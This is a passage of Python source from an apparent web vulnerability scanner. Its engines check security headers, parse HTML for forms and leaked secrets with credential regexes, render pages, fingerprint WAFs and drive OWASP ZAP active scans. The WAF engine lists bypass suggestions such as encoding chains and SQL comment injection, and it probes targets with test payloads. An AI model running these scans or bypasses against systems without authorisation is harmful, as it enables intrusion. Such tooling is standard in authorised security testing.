            log_engine(5, f"WHOIS: {e}", "error")

        return result


# ============================================================
# ENGINE 6: HTTP CLIENT (httpx + aiohttp)
# ============================================================
class HTTPEngine:
    """Multi-client HTTP analysis (requests + httpx + aiohttp)."""

    def __init__(self, config):
        self.config = config

    def scan(self, target_url):
        if not self.config.get("http_enabled"):
            return {"enabled": False}

        log_engine(6, "HTTP Client (requests + httpx + aiohttp)")
        result = {
            "enabled": True,
            "target_url": target_url,
            "responses": {},
            "headers_analysis": {},
            "cookies": [],
            "redirects": [],
            "security_headers": {},
            "vulnerabilities": [],
            "scan_time_ms": 0,
        }

        try:
            start = time.time()

            # --- Sync with requests ---
            result["responses"]["requests"] = self._test_requests(target_url)

            # --- Sync with httpx ---
            if HAS_HTTPX:
                result["responses"]["httpx"] = self._test_httpx(target_url)

            # --- Async with aiohttp ---
            if HAS_AIOHTTP and self.config.get("http_async_enabled"):
                try:
                    loop = asyncio.new_event_loop()
                    asyncio.set_event_loop(loop)
                    result["responses"]["aiohttp"] = loop.run_until_complete(
                        self._test_aiohttp(target_url)
                    )
                    loop.close()
                except:
                    pass

            # Analyze headers
            primary = result["responses"].get("requests") or result["responses"].get("httpx", {})
            if primary and primary.get("headers"):
                result["headers_analysis"] = self._analyze_headers(primary["headers"])
                result["security_headers"] = self._check_security_headers(primary["headers"])
                result["cookies"] = primary.get("cookies", [])
                result["redirects"] = primary.get("redirects", [])

                # Security header vulnerabilities
                sec_vulns = self._security_header_vulns(result["security_headers"])
                result["vulnerabilities"].extend(sec_vulns)

            elapsed = (time.time() - start) * 1000
            result["scan_time_ms"] = elapsed

            clients_used = len([v for v in result["responses"].values() if v])
            log_engine(6, f"HTTP: {clients_used} clients, "
                       f"{len(result['vulnerabilities'])} header issues", "success")

        except Exception as e:
            result["error"] = str(e)
            log_engine(6, f"HTTP: {e}", "error")

        return result

    def _test_requests(self, url):
        """Test with requests library."""
        try:
            start = time.time()
            resp = safe_request(url, timeout=self.config.get("http_timeout", 30))
            if not resp:
                return {}

            elapsed = (time.time() - start) * 1000

            redirects = []
            for r in resp.history:
                redirects.append({
                    "status": r.status_code,
                    "url": r.url,
                })

            cookies = []
            for cookie in resp.cookies:
                cookies.append({
                    "name": cookie.name,
                    "value": cookie.value[:50],
                    "domain": cookie.domain,
                    "path": cookie.path,
                    "secure": cookie.secure,
                    "httponly": "httponly" in str(cookie._rest).lower() if hasattr(cookie, '_rest') else False,
                })

            return {
                "status_code": resp.status_code,
                "headers": dict(resp.headers),
                "response_time_ms": elapsed,
                "content_length": len(resp.content),
                "content_type": resp.headers.get("Content-Type", ""),
                "encoding": resp.encoding,
                "final_url": resp.url,
                "redirects": redirects,
                "cookies": cookies,
                "server": resp.headers.get("Server", ""),
                "powered_by": resp.headers.get("X-Powered-By", ""),
            }
        except Exception as e:
            return {"error": str(e)}

    def _test_httpx(self, url):
        """Test with httpx library."""
        try:
            client = httpx_lib.Client(
                follow_redirects=True,
                timeout=self.config.get("http_timeout", 30),
                verify=False,
            )
            start = time.time()
            resp = client.get(url)
            elapsed = (time.time() - start) * 1000

            http2 = resp.http_version == "HTTP/2" if hasattr(resp, 'http_version') else False

            return {
                "status_code": resp.status_code,
                "headers": dict(resp.headers),
                "response_time_ms": elapsed,
                "content_length": len(resp.content),
                "http2": http2,
                "server": resp.headers.get("server", ""),
            }
        except Exception as e:
            return {"error": str(e)}

    async def _test_aiohttp(self, url):
        """Test with aiohttp (async)."""
        try:
            import aiohttp as aio
            timeout = aio.ClientTimeout(total=self.config.get("http_timeout", 30))
            async with aio.ClientSession(timeout=timeout) as session:
                start = time.time()
                async with session.get(url, ssl=False) as resp:
                    elapsed = (time.time() - start) * 1000
                    text = await resp.text()
                    return {
                        "status_code": resp.status,
                        "headers": dict(resp.headers),
                        "response_time_ms": elapsed,
                        "content_length": len(text),
                    }
        except Exception as e:
            return {"error": str(e)}

    def _analyze_headers(self, headers):
        """Analyze response headers."""
        return {
            "server": headers.get("Server", headers.get("server", "")),
            "powered_by": headers.get("X-Powered-By", headers.get("x-powered-by", "")),
            "content_type": headers.get("Content-Type", headers.get("content-type", "")),
            "cache_control": headers.get("Cache-Control", headers.get("cache-control", "")),
            "total_headers": len(headers),
        }

    def _check_security_headers(self, headers):
        """Check security headers presence."""
        security = {
            "strict_transport_security": {
                "present": bool(headers.get("Strict-Transport-Security",
                                             headers.get("strict-transport-security"))),
                "value": headers.get("Strict-Transport-Security",
                                      headers.get("strict-transport-security", "")),
            },
            "x_frame_options": {
                "present": bool(headers.get("X-Frame-Options",
                                             headers.get("x-frame-options"))),
                "value": headers.get("X-Frame-Options",
                                      headers.get("x-frame-options", "")),
            },
            "x_content_type_options": {
                "present": bool(headers.get("X-Content-Type-Options",
                                             headers.get("x-content-type-options"))),
                "value": headers.get("X-Content-Type-Options",
                                      headers.get("x-content-type-options", "")),
            },
            "content_security_policy": {
                "present": bool(headers.get("Content-Security-Policy",
                                             headers.get("content-security-policy"))),
                "value": headers.get("Content-Security-Policy",
                                      headers.get("content-security-policy", "")),
            },
            "x_xss_protection": {
                "present": bool(headers.get("X-XSS-Protection",
                                             headers.get("x-xss-protection"))),
                "value": headers.get("X-XSS-Protection",
                                      headers.get("x-xss-protection", "")),
            },
            "referrer_policy": {
                "present": bool(headers.get("Referrer-Policy",
                                             headers.get("referrer-policy"))),
                "value": headers.get("Referrer-Policy",
                                      headers.get("referrer-policy", "")),
            },
            "permissions_policy": {
                "present": bool(headers.get("Permissions-Policy",
                                             headers.get("permissions-policy"))),
                "value": headers.get("Permissions-Policy",
                                      headers.get("permissions-policy", "")),
            },
        }
        return security

    def _security_header_vulns(self, security_headers):
        """Generate vulnerabilities from missing security headers."""
        vulns = []
        header_map = {
            "strict_transport_security": {
                "name": "Missing HSTS Header",
                "severity": "Medium",
                "type": "missing_security_header",
            },
            "x_frame_options": {
                "name": "Missing X-Frame-Options",
                "severity": "Medium",
                "type": "missing_security_header",
            },
            "x_content_type_options": {
                "name": "Missing X-Content-Type-Options",
                "severity": "Low",
                "type": "missing_security_header",
            },
            "content_security_policy": {
                "name": "Missing Content-Security-Policy",
                "severity": "Medium",
                "type": "missing_security_header",
            },
            "referrer_policy": {
                "name": "Missing Referrer-Policy",
                "severity": "Low",
                "type": "missing_security_header",
            },
        }

        for header_key, vuln_template in header_map.items():
            if not security_headers.get(header_key, {}).get("present"):
                vuln = dict(vuln_template)
                vuln["evidence"] = f"Header '{header_key}' not found in response"
                vulns.append(vuln)

        # Server info disclosure
        return vulns


# ============================================================
# ENGINE 7: HTML PARSER (bs4 + lxml + selectolax)
# ============================================================
class HTMLParserEngine:
    """Multi-parser HTML analysis."""

    def __init__(self, config):
        self.config = config

    def scan(self, target_url, response_text=None):
        if not self.config.get("html_enabled"):
            return {"enabled": False}

        log_engine(7, "HTML Parser (bs4 + lxml + selectolax)")

        # Fetch page if no response provided
        if not response_text:
            resp = safe_request(target_url, timeout=self.config.get("http_timeout", 30))
            if resp:
                response_text = resp.text
            else:
                return {"enabled": True, "error": "Failed to fetch page"}

        result = {
            "enabled": True,
            "target_url": target_url,
            "forms": [],
            "inputs": [],
            "links": [],
            "scripts": [],
            "meta_tags": [],
            "comments": [],
            "emails": [],
            "phones": [],
            "secrets": [],
            "sensitive_paths": [],
            "parser_comparison": {},
            "vulnerabilities": [],
            "scan_time_ms": 0,
        }

        try:
            start = time.time()

            # --- Parse with BeautifulSoup + lxml ---
            soup = BeautifulSoup(response_text, "lxml")
            result["forms"] = self._extract_forms(soup, target_url)
            result["inputs"] = self._extract_all_inputs(soup)
            result["links"] = self._extract_links(soup, target_url)
            result["scripts"] = self._extract_scripts(soup)
            result["meta_tags"] = self._extract_meta(soup)
            result["comments"] = self._extract_comments(response_text)
            result["emails"] = self._extract_emails(response_text)
            result["phones"] = self._extract_phones(response_text)
            result["secrets"] = self._extract_secrets(response_text)

            # --- Parse with selectolax for comparison ---
            if HAS_SELECTOLAX and self.config.get("html_multi_parser"):
                from selectolax.parser import HTMLParser as SLParser
                sl_soup = SLParser(response_text)
                result["parser_comparison"] = {
                    "bs4_forms": len(result["forms"]),
                    "selectolax_forms": len(list(sl_soup.css("form"))),
                    "bs4_links": len(result["links"]),
                    "selectolax_links": len(list(sl_soup.css("a"))),
                    "bs4_scripts": len(result["scripts"]),
                    "selectolax_scripts": len(list(sl_soup.css("script"))),
                }

            # Generate findings from forms
            for form in result["forms"]:
                for vuln in form.get("potential_vulnerabilities", []):
                    result["vulnerabilities"].append(vuln)

            # Sensitive comments
            for comment in result["comments"]:
                if comment.get("sensitive"):
                    result["vulnerabilities"].append({
                        "name": "Sensitive HTML Comment",
                        "severity": "Medium",
                        "type": "info_disclosure",
                        "evidence": comment["text"][:200],
                    })

            # Secrets
            for secret in result["secrets"]:
                result["vulnerabilities"].append({
                    "name": f"Potential Secret: {secret['type']}",
                    "severity": "High",
                    "type": "secret_exposure",
                    "evidence": secret["value"][:100],
                    "context": secret.get("context", ""),
                })

            elapsed = (time.time() - start) * 1000
            result["scan_time_ms"] = elapsed

            log_engine(7, f"HTML: {len(result['forms'])} forms, "
                       f"{len(result['links'])} links, "
                       f"{len(result['secrets'])} secrets", "success")

        except Exception as e:
            result["error"] = str(e)
            log_engine(7, f"HTML: {e}", "error")

        return result

    def _extract_forms(self, soup, base_url):
        """Extract and analyze all forms."""
        forms = []
        for i, form in enumerate(soup.find_all("form")):
            action = form.get("action", "")
            if action and not action.startswith(("http", "//")):
                action = urljoin(base_url, action)

            form_data = {
                "form_id": i + 1,
                "action": action or base_url,
                "method": form.get("method", "GET").upper(),
                "enctype": form.get("enctype", ""),
                "name": form.get("name", ""),
                "id": form.get("id", ""),
                "inputs": [],
                "has_csrf": False,
                "potential_vulnerabilities": [],
            }

            csrf_token_names = [
                "csrf", "csrf_token", "_token", "token", "_csrf",
                "csrfmiddlewaretoken", "authenticity_token", "_wpnonce",
                "__RequestVerificationToken", "csrfmiddlewaretoken",
            ]

            for inp in form.find_all(["input", "textarea", "select"]):
                input_data = {
                    "tag": inp.name,
                    "type": inp.get("type", "text") if inp.name == "input" else inp.name,
                    "name": inp.get("name", ""),
                    "id": inp.get("id", ""),
                    "value": inp.get("value", ""),
                    "placeholder": inp.get("placeholder", ""),
                    "required": inp.has_attr("required"),
                    "autocomplete": inp.get("autocomplete", ""),
                }
                form_data["inputs"].append(input_data)

                # Check CSRF
                if input_data["name"].lower() in csrf_token_names:
                    form_data["has_csrf"] = True

            # Vulnerability checks
            if not form_data["has_csrf"] and form_data["method"] == "POST":
                form_data["potential_vulnerabilities"].append({
                    "name": "Missing CSRF Token",
                    "severity": "Medium",
                    "type": "csrf",
                    "evidence": f"Form '{form_data.get('name') or form_data.get('id') or form_data['form_id']}' "
                               f"has no CSRF token",
                    "form_action": form_data["action"],
                    "form_method": form_data["method"],
                    "form_inputs": [inp["name"] for inp in form_data["inputs"]],
                })

            # Password field checks
            for inp in form_data["inputs"]:
                if inp["type"] == "password":
                    if not form_data.get("enctype") and form_data["action"].startswith("http://"):
                        form_data["potential_vulnerabilities"].append({
                            "name": "Password Over HTTP",
                            "severity": "High",
                            "type": "credentials_over_http",
                            "evidence": f"Password field in form submitted over HTTP",
                        })
                    if inp.get("autocomplete") != "off":
                        form_data["potential_vulnerabilities"].append({
                            "name": "Password Autocomplete Enabled",
                            "severity": "Low",
                            "type": "autocomplete_enabled",
                            "evidence": "Password field has autocomplete enabled",
                        })

            forms.append(form_data)

        return forms

    def _extract_all_inputs(self, soup):
        """Extract all input elements."""
        inputs = []
        for inp in soup.find_all("input"):
            inputs.append({
                "type": inp.get("type", "text"),
                "name": inp.get("name", ""),
                "id": inp.get("id", ""),
                "value": inp.get("value", ""),
            })
        return inputs

    def _extract_links(self, soup, base_url):
        """Extract all links."""
        links = []
        seen = set()
        for a in soup.find_all("a", href=True):
            href = a["href"]
            if href.startswith(("javascript:", "mailto:", "tel:", "#")):
                continue
            full_url = urljoin(base_url, href)
            if full_url not in seen:
                seen.add(full_url)
                parsed = urlparse(full_url)
                links.append({
                    "url": full_url,
                    "text": a.get_text(strip=True)[:100],
                    "is_external": parsed.netloc != urlparse(base_url).netloc,
                    "has_params": bool(parsed.query),
                })
        return links

    def _extract_scripts(self, soup):
        """Extract all script tags."""
        scripts = []
        for script in soup.find_all("script"):
            src = script.get("src", "")
            inline = script.string or ""
            scripts.append({
                "src": src,
                "inline": bool(inline and len(inline.strip()) > 0),
                "inline_length": len(inline.strip()) if inline else 0,
                "type": script.get("type", ""),
                "async": script.has_attr("async"),
                "defer": script.has_attr("defer"),
                "integrity": script.get("integrity", ""),
            })
        return scripts

    def _extract_meta(self, soup):
        """Extract meta tags."""
        metas = []
        for meta in soup.find_all("meta"):
            metas.append({
                "name": meta.get("name", ""),
                "content": meta.get("content", ""),
                "property": meta.get("property", ""),
                "http_equiv": meta.get("http-equiv", ""),
                "charset": meta.get("charset", ""),
            })
        return metas

    def _extract_comments(self, text):
        """Extract HTML comments."""
        comments = []
        pattern = re.compile(r'<!--(.*?)-->', re.DOTALL)
        sensitive_keywords = [
            "todo", "fixme", "hack", "password", "secret", "api_key",
            "api-key", "apikey", "token", "credential", "admin",
            "debug", "temp", "test", "backup", "private",
        ]

        for match in pattern.finditer(text):
            comment_text = match.group(1).strip()
            is_sensitive = any(kw in comment_text.lower() for kw in sensitive_keywords)
            comments.append({
                "text": comment_text[:500],
                "sensitive": is_sensitive,
                "length": len(comment_text),
            })
        return comments

    def _extract_emails(self, text):
        """Extract email addresses."""
        pattern = re.compile(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}')
        return list(set(pattern.findall(text)))

    def _extract_phones(self, text):
        """Extract phone numbers."""
        pattern = re.compile(r'[\+]?[(]?[0-9]{1,4}[)]?[-\s\./0-9]{7,15}')
        return list(set(pattern.findall(text)))[:20]

    def _extract_secrets(self, text):
        """Extract potential secrets from page source."""
        secrets = []
        patterns = {
            "api_key": r'(?i)(?:api[_-]?key|apikey)\s*[:=]\s*["\']([a-zA-Z0-9_\-]{16,})["\']',
            "aws_key": r'(?i)AKIA[0-9A-Z]{16}',
            "private_key": r'-----BEGIN\s+(?:RSA\s+)?PRIVATE\s+KEY-----',
            "jwt": r'eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+',
            "github_token": r'(?i)(?:ghp|gho|ghu|ghs|ghr)_[a-zA-Z0-9]{36,}',
            "slack_token": r'xox[baprs]-[0-9]{10,13}-[0-9]{10,13}-[a-zA-Z0-9]{24,}',
            "google_api": r'AIza[0-9A-Za-z\-_]{35}',
            "stripe_key": r'(?:sk|pk)_(?:test|live)_[0-9a-zA-Z]{24,}',
            "password_in_code": r'(?i)(?:password|passwd|pwd)\s*[:=]\s*["\']([^"\']{4,})["\']',
            "db_connection": r'(?i)(?:mysql|postgres|mongodb)://[^\s"\']+:[^\s"\']+@',
        }

        for secret_type, pattern in patterns.items():
            matches = re.findall(pattern, text)
            for match in matches[:3]:
                if isinstance(match, tuple):
                    match = match[0]
                secrets.append({
                    "type": secret_type,
                    "value": str(match)[:100],
                    "context": secret_type,
                })

        return secrets


# ============================================================
# ENGINE 8: JS RENDERER (Playwright)
# ============================================================
class JSRenderEngine:
    """JavaScript rendering with Playwright."""

    def __init__(self, config):
        self.config = config
        self.available = HAS_PLAYWRIGHT and config.get("js_render_enabled")

    def scan(self, target_url):
        if not self.available:
            return {"enabled": False, "error": "Playwright not available"}

        log_engine(8, "JS Renderer (Playwright)")
        result = {
            "enabled": True,
            "target_url": target_url,
            "rendered_html": "",
            "rendered_forms": [],
            "rendered_links": [],
            "js_errors": [],
            "network_requests": [],
            "console_logs": [],
            "screenshots": [],
            "dynamic_content_detected": False,
            "vulnerabilities": [],
            "scan_time_ms": 0,
        }

        try:
            start = time.time()

            from playwright.sync_api import sync_playwright

            with sync_playwright() as p:
                browser = p.chromium.launch(headless=True)
                context = browser.new_context(
                    user_agent=random.choice(self.config.get("http_user_agents", [])),
                    viewport={"width": 1920, "height": 1080},
                )
                page = context.new_page()

                # Collect JS errors
                js_errors = []
                page.on("pageerror", lambda err: js_errors.append(str(err)))

                # Collect console logs
                console_logs = []
                page.on("console", lambda msg: console_logs.append({
                    "type": msg.type,
                    "text": msg.text[:200],
                }))

                # Collect network requests
                network_requests = []
                page.on("request", lambda req: network_requests.append({
                    "url": req.url[:200],
                    "method": req.method,
                    "resource_type": req.resource_type,
                }))

                # Navigate
                page.goto(target_url, wait_until="networkidle",
                          timeout=self.config.get("js_render_timeout", 30000))

                # Wait for dynamic content
                page.wait_for_timeout(self.config.get("js_render_wait", 3000))

                # Get rendered HTML
                rendered_html = page.content()
                result["rendered_html"] = rendered_html[:50000]

                # Extract rendered forms
                forms = page.query_selector_all("form")
                for form in forms:
                    action = form.get_attribute("action") or ""
                    method = form.get_attribute("method") or "GET"
                    inputs = form.query_selector_all("input, textarea, select")
                    input_data = []
                    for inp in inputs:
                        input_data.append({
                            "name": inp.get_attribute("name") or "",
                            "type": inp.get_attribute("type") or "text",
                            "id": inp.get_attribute("id") or "",
                        })
                    result["rendered_forms"].append({
                        "action": action,
                        "method": method.upper(),
                        "inputs": input_data,
                    })

                # Extract rendered links
                links = page.query_selector_all("a[href]")
                for link in links[:100]:
                    href = link.get_attribute("href")
                    if href:
                        result["rendered_links"].append(href)

                # Screenshot
                if self.config.get("js_render_screenshot"):
                    ss_path = os.path.join(self.config.get("output_dir", "./indigo_results"),
                                            "screenshot.png")
                    os.makedirs(os.path.dirname(ss_path), exist_ok=True)
                    page.screenshot(path=ss_path, full_page=True)
                    result["screenshots"].append(ss_path)

                result["js_errors"] = js_errors[:10]
                result["console_logs"] = console_logs[:20]
                result["network_requests"] = network_requests[:50]

                # Compare with static HTML
                static_resp = safe_request(target_url, timeout=15)
                if static_resp:
                    static_len = len(static_resp.text)
                    rendered_len = len(rendered_html)
                    if rendered_len > static_len * 1.5:
                        result["dynamic_content_detected"] = True

                browser.close()

            elapsed = (time.time() - start) * 1000
            result["scan_time_ms"] = elapsed

            log_engine(8, f"Playwright: {len(result['rendered_forms'])} forms, "
                       f"{len(result['js_errors'])} JS errors", "success")

        except Exception as e:
            result["error"] = str(e)
            log_engine(8, f"Playwright: {e}", "error")

        return result


# ============================================================
# ENGINE 9: WAF DETECTOR
# ============================================================
class WAFDetectorEngine:
    """Web Application Firewall fingerprinting."""

    WAF_SIGNATURES = {
        "cloudflare": {
            "headers": {"server": r"cloudflare", "cf-ray": r".+"},
            "body": [r"Attention Required.*Cloudflare", r"cf-browser-verification"],
        },
        "aws_waf": {
            "headers": {"x-amzn-requestid": r".+"},
            "body": [r"Request blocked.*AWS"],
        },
        "mod_security": {
            "headers": {},
            "body": [r"Not Acceptable", r"mod_security", r"ModSecurity"],
        },
        "sucuri": {
            "headers": {"x-sucuri-id": r".+", "server": r"Sucuri"},
            "body": [r"Access Denied.*Sucuri"],
        },
        "imperva": {
            "headers": {"x-iinfo": r".+", "x-cdn": r"Incapsula"},
            "body": [r"Incapsula", r"imperva"],
        },
        "akamai": {
            "headers": {"x-akamai-transformed": r".+"},
            "body": [r"akamai", r"Access Denied.*Reference"],
        },
        "f5_bigip": {
            "headers": {"set-cookie": r"BigIPServer|BIGipServer"},
            "body": [],
        },
        "barracuda": {
            "headers": {},
            "body": [r"Barracuda"],
        },
        "fortinet": {
            "headers": {"server": r"FortiWeb"},
            "body": [r"FortiGate", r"Fortinet"],
        },
        "wordfence": {
            "headers": {},
            "body": [r"Generated by Wordfence", r"wordfence"],
        },
    }

    def __init__(self, config):
        self.config = config

    def scan(self, target_url):
        if not self.config.get("waf_enabled"):
            return {"enabled": False}

        log_engine(9, "WAF Detector")
        result = {
            "enabled": True,
            "target_url": target_url,
            "waf_detected": False,
            "waf_name": "",
            "waf_confidence": 0.0,
            "waf_signatures_matched": [],
            "bypass_suggestions": [],
            "scan_time_ms": 0,
        }

        try:
            start = time.time()

            # Normal request
            resp = safe_request(target_url, timeout=15)
            if not resp:
                result["error"] = "Failed to fetch target"
                log_engine(9, "WAF: Failed to fetch", "error")
                return result

            headers_lower = {k.lower(): v for k, v in resp.headers.items()}
            body = resp.text

            # Check signatures
            scores = {}
            for waf_name, sig in self.WAF_SIGNATURES.items():
                score = 0
                matches = []

                # Header checks
                for header_name, pattern in sig.get("headers", {}).items():
                    header_val = headers_lower.get(header_name.lower(), "")
                    if re.search(pattern, header_val, re.IGNORECASE):
                        score += 0.4
                        matches.append(f"Header: {header_name}")

                # Body checks
                for pattern in sig.get("body", []):
                    if re.search(pattern, body, re.IGNORECASE):
                        score += 0.3
                        matches.append(f"Body pattern: {pattern[:50]}")

                if score > 0:
                    scores[waf_name] = {"score": min(score, 1.0), "matches": matches}

            # Payload-based detection
            test_payloads = self.config.get("waf_test_payloads", [])
            for payload in test_payloads:
                try:
                    test_url = target_url + ("&" if "?" in target_url else "?") + f"waf_test={quote(payload)}"
                    test_resp = safe_request(test_url, timeout=10)
                    if test_resp:
                        if test_resp.status_code in [403, 406, 503]:
                            # Possible WAF block
                            for waf_name in scores:
                                scores[waf_name]["score"] = min(scores[waf_name]["score"] + 0.2, 1.0)

                            # Check for new WAF signatures in block page
                            for waf_name, sig in self.WAF_SIGNATURES.items():
                                for pattern in sig.get("body", []):
                                    if re.search(pattern, test_resp.text, re.IGNORECASE):
                                        if waf_name not in scores:
                                            scores[waf_name] = {"score": 0.5, "matches": []}
                                        scores[waf_name]["matches"].append(f"Block page: {pattern[:50]}")
                except:
                    pass

            # Determine best match
            if scores:
                best_waf = max(scores.items(), key=lambda x: x[1]["score"])
                result["waf_detected"] = best_waf[1]["score"] > 0.3
                result["waf_name"] = best_waf[0] if result["waf_detected"] else ""
                result["waf_confidence"] = best_waf[1]["score"]
                result["waf_signatures_matched"] = best_waf[1]["matches"]

                # All detected WAFs
                result["all_detected"] = {
                    name: {"confidence": data["score"], "matches": data["matches"]}
                    for name, data in scores.items() if data["score"] > 0.2
                }

                # Bypass suggestions
                if result["waf_detected"]:
                    result["bypass_suggestions"] = self._get_bypass_suggestions(result["waf_name"])

            elapsed = (time.time() - start) * 1000
            result["scan_time_ms"] = elapsed

            status = "warning" if result["waf_detected"] else "success"
            waf_info = f"WAF: {result['waf_name']}" if result["waf_detected"] else "No WAF detected"
            log_engine(9, waf_info, status)

        except Exception as e:
            result["error"] = str(e)
            log_engine(9, f"WAF: {e}", "error")

        return result

    def _get_bypass_suggestions(self, waf_name):
        """Get WAF-specific bypass suggestions."""
        suggestions = {
            "cloudflare": [
                "Use encoding chains (URL → Unicode → Hex)",
                "Try case mutation on keywords",
                "Use HTTP parameter pollution",
                "Try whitespace variations (%09, %0a, %0b)",
            ],
            "mod_security": [
                "Use SQL comment injection (/**/)",
                "Try double URL encoding",
                "Use Unicode normalization bypass",
                "Try content-type confusion",
            ],
            "aws_waf": [
                "Use chunked transfer encoding",
                "Try multipart form data",
                "Use HTTP/2 features",
                "Try parameter name pollution",
            ],
        }
        return suggestions.get(waf_name, [
            "Try multiple encoding layers",
            "Use case mutation",
            "Try whitespace injection",
            "Use comment-based obfuscation",
        ])


# ============================================================
# ENGINE 10: ZAP SCANNER (PROPERLY CONFIGURED)
# ============================================================
class ZAPEngine:
    """OWASP ZAP scanner with PROPER form handling and active scanning."""

    def __init__(self, config):
        self.config = config
        self.zap = None

    def _start_zap(self):
        """Start ZAP daemon."""
        zap_path = self._find_zap()
        if not zap_path:
            return False

        proxy_host = self.config.get("zap_proxy_host", "127.0.0.1")
        proxy_port = self.config.get("zap_proxy_port", 8090)
        api_key = self.config.get("zap_api_key", "indigo-zap-key-12345")

        try:
            zap_cmd = [
                zap_path, "-daemon",
                "-host", proxy_host,
                "-port", str(proxy_port),
                "-config", f"api.key={api_key}",
                "-config", "api.disablekey=false",
                "-config", "connection.timeoutInSecs=120",
                "-config", "spider.maxDepth=5",
                "-config", "formhandler.enabled=true",
            ]

            self.zap_process = subprocess.Popen(
                zap_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )
            time.sleep(15)  # Wait for ZAP to start

            # Verify connection
            import requests
            resp = requests.get(
                f"http://{proxy_host}:{proxy_port}",
                timeout=10
            )
            return True
        except:
            return False

    def _find_zap(self):
        """Find ZAP installation."""
        paths = [
            "/usr/share/zaproxy/zap.sh",
            "/opt/zaproxy/zap.sh",
            "/usr/local/bin/zap.sh",
            os.path.expanduser("~/ZAP/zap.sh"),
            os.path.expanduser("~/zaproxy/zap.sh"),
            "zap.sh",
            "zap",
        ]
        for p in paths:
            if os.path.exists(p):
                return p
        return None

    def scan(self, target_url):
        if not self.config.get("zap_enabled"):
            return {"enabled": False}

        log_engine(10, "OWASP ZAP Scanner (Enhanced Config)")
        result = {
            "enabled": True,
            "target_url": target_url,
            "spider_urls": [],
            "active_alerts": [],
            "passive_alerts": [],
            "forms_tested": [],
            "ajax_spider_urls": [],
            "scan_time_ms": 0,
        }

        try:
            start = time.time()

            # Try to connect to ZAP
            try:
                from zapv2 import ZAPv2
                proxy_host = self.config.get("zap_proxy_host", "127.0.0.1")
                proxy_port = self.config.get("zap_proxy_port", 8090)
                api_key = self.config.get("zap_api_key", "indigo-zap-key-12345")

                proxies = {
                    "http": f"http://{proxy_host}:{proxy_port}",
                    "https": f"http://{proxy_host}:{proxy_port}",
                }

                self.zap = ZAPv2(
                    apikey=api_key,
                    proxies=proxies,
                )

                # Test connection
                version = self.zap.core.version
                print(f"      ZAP version: {version}")

            except ImportError:
                result["error"] = "zapv2 not installed. Install: pip install python-owasp-zap-v2.4"
                log_engine(10, "ZAP: zapv2 not installed", "error")
                return result
            except Exception as e:
                # Try starting ZAP
                if self._start_zap():
                    from zapv2 import ZAPv2
                    self.zap = ZAPv2(
                        apikey=api_key,
                        proxies=proxies,
                    )
                else:
                    result["error"] = f"Cannot connect to ZAP: {e}"
                    log_engine(10, f"ZAP: {e}", "error")
                    return result

            # ========================================
            # STEP 1: Configure Form Handler
            # ========================================
            print(f"      [1/5] Configuring form handler...")
            try:
                # Enable form handler for auto-fill
                self.zap.formhandler.set_option_form_handler_enabled(True)

                # Add common form field values
                form_fields = {
                    "username": "admin",
                    "user": "admin",
                    "email": "test@test.com",
                    "password": "password123",
                    "pass": "password123",
                    "login": "admin",
                    "name": "test",
                    "search": "test",
                    "query": "test",
                    "q": "test",
                    "id": "1",
                    "page": "1",
                    "action": "login",
                    "submit": "Submit",
                }
                for field_name, field_value in form_fields.items():
                    try:
                        self.zap.formhandler.add_form_handler_field(
                            field_name, field_value, enabled=True, field_type="text"
                        )
                    except:
                        pass
            except Exception as e:
                print(f"      Form handler config: {e}")

            # ========================================
            # STEP 2: Spider (Standard)
            # ========================================
            print(f"      [2/5] Running spider...")
            try:
                self.zap.urlopen(target_url)
                time.sleep(2)

                spider_id = self.zap.spider.scan(
                    target_url,
                    maxchildren=self.config.get("zap_spider_max_children", 50),
                    recurse=True,
                    subtreeonly=False,
                )

                # Wait for spider
                timeout = self.config.get("zap_timeout", 900)
                start_time = time.time()
                while int(self.zap.spider.status(spider_id)) < 100:
                    if time.time() - start_time > timeout:
                        break
                    time.sleep(2)
                    progress = self.zap.spider.status(spider_id)
                    print(f"      Spider progress: {progress}%")

                result["spider_urls"] = self.zap.spider.results(spider_id)
                print(f"      Spider found: {len(result['spider_urls'])} URLs")

            except Exception as e:
                print(f"      Spider error: {e}")

            # ========================================
            # STEP 3: AJAX Spider (for JS-heavy sites)
            # ========================================
            if self.config.get("zap_ajax_spider_enabled"):
                print(f"      [3/5] Running AJAX spider...")
                try:
                    self.zap.ajaxSpider.scan(target_url, subtreeonly=False)

                    # Wait for AJAX spider
                    ajax_timeout = min(300, timeout)
                    start_time = time.time()
                    while self.zap.ajaxSpider.status == "running":
                        if time.time() - start_time > ajax_timeout:
                            self.zap.ajaxSpider.stop()
                            break
                        time.sleep(5)

                    result["ajax_spider_urls"] = [
                        r.get("requestHeader", "") for r in self.zap.ajaxSpider.results()
                    ]
                    print(f"      AJAX spider found: {len(result['ajax_spider_urls'])} URLs")
                except Exception as e:
                    print(f"      AJAX spider error: {e}")

            # ========================================
            # STEP 4: Active Scan (PROPERLY CONFIGURED)
            # ========================================
            print(f"      [4/5] Running active scan...")
            try:
                # Set scan policy strength
                try:
                    # Set all scanners to high strength
                    policies = self.zap.ascan.scan_policy_names
                    for policy in policies:
                        scanners = self.zap.ascan.scanners(policy_name=policy)
                        for scanner in scanners:
                            scanner_id = scanner.get("id")
                            try:
                                self.zap.ascan.set_scanner_alert_threshold(
                                    id=scanner_id,
                                    alertthreshold=self.config.get("zap_active_scan_alert_threshold", 1),
                                    scanpolicyname=policy,
                                )
                                self.zap.ascan.set_scanner_attack_strength(
                                    id=scanner_id,
                                    attackstrength="MEDIUM",
                                    scanpolicyname=policy,
                                )
                            except:
                                pass
                except:
                    pass

                # Run active scan
                scan_id = self.zap.ascan.scan(
                    target_url,
                    recurse=True,
                    inscopeonly=False,
                    scanpolicyname=self.config.get("zap_active_scan_policy", ""),
                    method=None,
                    postdata=None,
                )

                # Wait for active scan
                start_time = time.time()
                while int(self.zap.ascan.status(scan_id)) < 100:
                    if time.time() - start_time > timeout:
                        break
                    time.sleep(5)
                    progress = self.zap.ascan.status(scan_id)
                    print(f"      Active scan progress: {progress}%")

                # Get alerts
                alerts = self.zap.core.alerts(baseurl=target_url)
                for alert in alerts:
                    alert_data = {
                        "name": alert.get("name", ""),
                        "risk": alert.get("risk", ""),
                        "confidence": alert.get("confidence", ""),
                        "description": alert.get("description", "")[:500],
                        "solution": alert.get("solution", "")[:500],
                        "evidence": alert.get("evidence", "")[:200],
                        "url": alert.get("url", ""),
